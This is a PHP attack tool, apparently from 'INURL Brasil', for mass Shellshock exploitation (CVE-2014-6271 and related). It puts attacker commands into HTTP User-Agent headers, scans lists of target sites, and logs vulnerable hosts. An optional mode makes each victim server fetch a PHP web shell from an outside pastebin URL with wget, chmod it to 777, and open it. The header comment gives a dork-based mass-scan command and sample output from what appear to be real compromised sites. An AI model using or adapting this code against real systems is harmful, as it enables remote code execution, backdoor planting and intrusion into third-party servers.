<?php

/*

  # SCRIPT by:     [ I N U R L  -  B R A S I L ] - [ By GoogleINURL ]
  # EXPLOIT NAME:  Xpl SHELLSHOCK Ch3ck Tool - (MASS)/ INURL BRASIL
  # AUTOR:         Cleiton Pinheiro / Nick: googleINURL
  # Email:         inurlbr@gmail.com
  # Blog:          http://blog.inurl.com.br
  # Twitter:       https://twitter.com/googleinurl
  # Fanpage:       https://fb.com/InurlBrasil
  # Pastebin       http://pastebin.com/u/Googleinurl
  # GIT:           https://github.com/googleinurl
  # PSS:           http://packetstormsecurity.com/user/googleinurl
  # YOUTUBE:       http://youtube.com/c/INURLBrasil
  # PLUS:          http://google.com/+INURLBrasil
  --------------------------------------------------------------------------------------

  # DESCRIPTION - VULNERABILITY(SHELLSHOCK)
  - CVE-2014-6271, CVE-2014-6277,
  - CVE-2014-6278, CVE-2014-7169,
  - CVE-2014-7186, CVE-2014-7187
  Is a vulnerability in GNU's bash shell that gives attackers access
  to run remote commands on a vulnerable system.
  --------------------------------------------------------------------------------------

  # DESCRIPTION - TOOL
  The tool inject a malicious user agent that allows exploring the vulnerabildiade
  sheelshock running server-side commands.
  --------------------------------------------------------------------------------------

  # EXECUTION
  -t : SET TARGET.
  -f : SET FILE TARGETS.
  -c : SET COMMAND.
  -w : SET UPLOAD SHELL PHP.
  Execute:
  php xplSHELLSHOCK.php -t target -c command
  php xplSHELLSHOCK.php -f targets.txt -c command
  SHELL UPLOAD: php xplSHELLSHOCK.php -t target -c command -w
  OUTPUT VULN: SHELLSHOCK_vull.txt
  --------------------------------------------------------------------------------------

  #  EXPLOIT MASS USE SCANNER INURLBR
  ./inurlbr.php --dork 'inurl:"/cgi-bin/login.sh"' -s out.txt -q 1,6 --command-vul "php xpl.php -t '_TARGETFULL_' -c pwd"
  --------------------------------------------------------------------------------------

  #  Exemples:
  php xpl.php -t 'http://www.camnpalxxx.com.br/cgi-bin/login.sh' -c pwd
  CMD:
  Linux serv 2.6.29.6-smp #2 SMP Mon Aug 17 00:52:54 CDT 2009 i686 Intel(R) Xeon(R) CPU           E5504  @ 2.00GHz GenuineIntel GNU/Linux
  uid=1000(icone) gid=100(users) groups=100(users)
  /ico/camnpal/cgi-bin
  END_CMD:


  php xpl.php -t 'http://www.bnmxxx.me.gov.ar/cgi-bin/wxis.exe/opac/?IsisScript=opac/opac.xis' -c pwd
  CMD:
  Linux sitiobnm 2.6.37BNM #26 SMP Tue Jan 25 19:22:26 ART 2011 x86_64 GNU/Linux
  uid=1005(webmaster) gid=1003(webmaster) groups=1003(webmaster)
  /mnt/volume1/sitio/data/catalogos/cgi-bin
  END_CMD:
  --------------------------------------------------------------------------------------


 */
error_reporting(1);
set_time_limit(0);
ini_set('display_errors', 1);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
ob_implicit_flush(true);
ob_end_flush();
$op_ = getopt('f:c:t:w::', array('help::'));

echo "\n\t[-] [Exploit]: Xpl SHELLSHOCK Ch3ck / INURL - BRASIL\n\t[?] [help]: --help\n\n";
$menu = "
    -t : SET TARGET.
    -f : SET FILE TARGETS.
    -c : SET COMMAND.
    -w : SET UPLOAD SHELL PHP.
    Execute:
                  php xplSHELLSHOCK.php -t target -c command
		  php xplSHELLSHOCK.php -f targets.txt -c command
    SHELL UPLOAD: php xplSHELLSHOCK.php -t target -c command -w
\n";
echo isset($op_['help']) ? $menu : NULL;

$cmd = not_isnull_empty($op_['c']) ? "uname -a && id && {$op_['c']}" : exit("\n\t[x] [ERRO] DEFINE COMMAND!\n");
$wget = "wget http://pastebin.com/raw.php?i=UD9UwaNd -O inurl.php; chmod 777 inurl.php";
$params['host'] = not_isnull_empty($op_['t']) ? $op_['t'] : NULL;
$params['user_agent_xpl'] = "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;{$cmd}; echo END_CMD:;\"";
$params['payload'] = "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;{$wget}; echo END_CMD:;\"";
$params['file'] = not_isnull_empty($op_['f']) ? $op_['f'] : NULL;
$params['line'] = "--------------------------------------------------------------";
not_isnull_empty($params['host']) && not_isnull_empty($params['file']) ? exit("\n\t[X] [ERRO] DEFINE TARGET OR FILE TARGET\n") : NULL;
not_isnull_empty($params['file']) ? __listTarget($params) . exit() : NULL;

echo "\t[+] [COMMAND]: {$cmd}\n";

function __plus() {
    ob_flush();
    flush();
}

function not_isnull_empty($valor = NULL) {
    RETURN !is_null($valor) && !empty($valor) ? TRUE : FALSE;
}

function __request($params, $op = 0) {
    $objcurl = curl_init($params['host']);
    curl_setopt($objcurl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($objcurl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($objcurl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($objcurl, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($objcurl, CURLOPT_TIMEOUT, 5);
    curl_setopt($objcurl, CURLOPT_FRESH_CONNECT, 1);
    curl_setopt($objcurl, CURLOPT_USERAGENT, $params['user_agent_xpl']);

    $info['corpo'] = curl_exec($objcurl) . __plus();
    $erro = curl_error($objcurl);

    not_isnull_empty($erro) ? print("\t[x] [ERROR]:  {$erro}\n")  : NULL;

    $_[0] = explode("\n", $info['corpo']);
    $_[1] = curl_getinfo($objcurl);

    if ($op != 0) {

        return $_;
    }

    if ($_[0][0] == '99887766555') {
        foreach ($_[0] as $valores) {

            $__.= $valores . "\n";
            if ($valores == 'END_CMD:')
                break;
        }
        $__ = str_replace('99887766555', '', $__);
        file_put_contents('SHELLSHOCK_vull.txt', "{$params['host']}{$__}{$params['line']}\n", FILE_APPEND);
        echo "\t[!] VULN SHELLSHOCK\n\t[!] OUTPUT SERVER:: {$__}";
        return TRUE;
    } else {

        echo "\t[x] [NOT VULN]\n";
    }
    curl_close($objcurl) . __plus();
    return FALSE;
}

function __listTarget($file) {

    $tgt_ = array_unique(array_filter(explode("\n", file_get_contents($file['file']))));
    echo "\n\t[!] [INFO] TOTAL SITES LOADED : " . count($tgt_) . "\n\n";

    foreach ($tgt_ as $url) {

        echo "\n\t[+] [INFO] SCANNING : {$url} \n";
        __plus();
        $file['host'] = $url;
        __request($file) . __plus();
    }
}

if (__request($params)) {

    $params['user_agent_xpl'] = $params['payload'];
    $h_ = parse_url($params['host']);
    $h__ = "http://{$h_['host']}{$h_['path']}/inurl.php?0=uname%20-a%20%26%26%20ls%20-la";

    if (isset($op_['w'])) {

        echo "\t[!] UPLOAD SHELL_SCRIPT!\n";
        $__ = __request($params, 1);

        if ($__[0][0] == '99887766555') {

            echo "\t[!] PAYLOAD: {$wget}\n";
            echo "\t[!] INCTION PAYLOAD SUCCESS\n";
            $params['host'] = $h__;
            $cmd = __request($params, 1);

            if ($cmd['http_code'] == 200) {

                echo "\t[!] SUCCESSFULLY UPLOADED FILE {$h__}\n";
                echo "\t[!] opening auxiliary window...\n";
                system("sudo xterm -geometry 134x50 -e curl -v '$h__'  > /dev/null &", $dados);
            } else {

                echo "\t[X] FAILURE TO FILE CREATION\n";
            }
        }
    }
    echo "\t" . $params['line'] . "\n";
}
